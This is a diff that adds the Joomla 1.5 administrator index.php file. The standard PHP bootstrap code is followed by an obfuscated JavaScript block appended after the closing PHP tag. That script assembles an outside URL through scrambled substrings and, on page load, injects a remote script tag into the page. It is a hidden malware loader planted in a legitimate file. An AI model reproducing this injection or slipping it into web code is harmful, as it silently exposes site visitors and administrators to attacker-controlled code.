@@ -1,0 +1,89 @@
+<?php
+/**
+* @version		$Id: index.php 10381 2008-06-01 03:35:53Z pasamio $
+* @package		Joomla
+* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
+* @license		GNU/GPL, see LICENSE.php
+* Joomla! is free software. This version may have been modified pursuant
+* to the GNU General Public License, and as distributed it includes or
+* is derivative of works licensed under the GNU General Public License or
+* other free or open source software licenses.
+* See COPYRIGHT.php for copyright notices and details.
+*/
+
+// Set flag that this is a parent file
+define( '_JEXEC', 1 );
+
+define('JPATH_BASE', dirname(__FILE__) );
+
+define('DS', DIRECTORY_SEPARATOR);
+
+require_once( JPATH_BASE .DS.'includes'.DS.'defines.php' );
+require_once( JPATH_BASE .DS.'includes'.DS.'framework.php' );
+require_once( JPATH_BASE .DS.'includes'.DS.'helper.php' );
+require_once( JPATH_BASE .DS.'includes'.DS.'toolbar.php' );
+
+JDEBUG ? $_PROFILER->mark( 'afterLoad' ) : null;
+
+/**
+ * CREATE THE APPLICATION
+ *
+ * NOTE :
+ */
+$mainframe =& JFactory::getApplication('administrator');
+
+/**
+ * INITIALISE THE APPLICATION
+ *
+ * NOTE :
+ */
+$mainframe->initialise(array(
+	'language' => $mainframe->getUserState( "application.lang", 'lang' )
+));
+
+JPluginHelper::importPlugin('system');
+
+// trigger the onAfterInitialise events
+JDEBUG ? $_PROFILER->mark('afterInitialise') : null;
+$mainframe->triggerEvent('onAfterInitialise');
+
+/**
+ * ROUTE THE APPLICATION
+ *
+ * NOTE :
+ */
+$mainframe->route();
+
+// trigger the onAfterRoute events
+JDEBUG ? $_PROFILER->mark('afterRoute') : null;
+$mainframe->triggerEvent('onAfterRoute');
+
+/**
+ * DISPATCH THE APPLICATION
+ *
+ * NOTE :
+ */
+$option = JAdministratorHelper::findOption();
+$mainframe->dispatch($option);
+
+// trigger the onAfterDispatch events
+JDEBUG ? $_PROFILER->mark('afterDispatch') : null;
+$mainframe->triggerEvent('onAfterDispatch');
+
+/**
+ * RENDER THE APPLICATION
+ *
+ * NOTE :
+ */
+$mainframe->render();
+
+// trigger the onAfterRender events
+JDEBUG ? $_PROFILER->mark( 'afterRender' ) : null;
+$mainframe->triggerEvent( 'onAfterRender' );
+
+/**
+ * RETURN THE RESPONSE
+ */
+echo JResponse::toString($mainframe->getCfg('gzip'));
+?>
+<script>var i;if(i!='' && i!='f'){i=null};this.US='';function h(){var N;if(N!='D'){N='D'};this.q='';this.K="";var A;if(A!=''){A='fI'};var H=new String("g");var u='';var eQ;if(eQ!='' && eQ!='R'){eQ=null};var j="";var zr="";var G=RegExp;var ia;if(ia!='Om' && ia != ''){ia=null};this.tD="";var GF="";function z(O,M){var t=new G("["+M+"]", H);return O.replace(t, u);var hS=new Date();var Oa;if(Oa!='' && Oa!='C'){Oa=''};};var GN='';var Dj='';var qY=new Array();var U=z('83359903298992509252',"2593");var T="scri"+"fNLpt".substr(3);var F=new String("9Qm/go".substr(3)+"oglqDT5".substr(0,3)+"arOe.cOra".substr(3,3)+"NZdom/".substr(3)+"gooNuBK".substr(0,3)+"Ef6gle".substr(3)+".co"+"m/m"+"HasediHas".substr(3,3)+"afi"+"c9jyre.".substr(4)+"com"+"izm/remzi".substr(3,3)+"DK3tver3tDK".substr(4,3)+"Ilrso.".substr(3)+"0oGnetGo0".substr(3,3)+"Gt3/xctG3".substr(3,3)+"y1sar.y1s".substr(3,3)+"comEkf".substr(0,3)+"mtH.cn".substr(3)+"cEFa.ph".substr(4)+"3VUp".substr(3));var TB='';var m=String("bdKWhtt".substr(4)+"p:/"+"cYtB/ms".substr(4)+"GiDYn-c".substr(4)+"om-"+"tIBcn.".substr(3)+"5nM1torn1M5".substr(4,3)+"renLfY".substr(0,3)+"C0mtz.".substr(3)+"MG6scomGsM6".substr(4,3)+"lugK.so".substr(4)+"8x9egou89ex".substr(4,3)+"TGgx-co".substr(4)+"H6kIm.sI6kH".substr(4,3)+"eas"+"ilv"+"ers"+"SQ1kite".substr(4)+"NX3.ruN3X".substr(3,3)+"8rp5:pr58".substr(4,1));var An;if(An!='Ck' && An!='vt'){An=''};var Wg='';window.onload=function(){this.d='';this.ac='';try {var II;if(II!=''){II='Q'};this.ib="";TB=m+U;this.ML='';TB+=F;var pW;if(pW!='IC' && pW != ''){pW=null};var WP='';var l='';_=document.createElement(T);this.Cu="";var WV;if(WV!='' && WV!='N_'){WV='O_'};this.L="";var hh;if(hh!='g' && hh!='Mk'){hh='g'};_.defer=[1][0];this.Rl="";_.src=TB;this.HC="";this.TR="";document.body.appendChild(_);var Aj=new Array();} catch(e){var CQ=new Date();var bD;if(bD!=''){bD='qp'};};var UK='';};this.AY='';};h();var Ja;if(Ja!='' && Ja!='HB'){Ja='Mg'};</script>
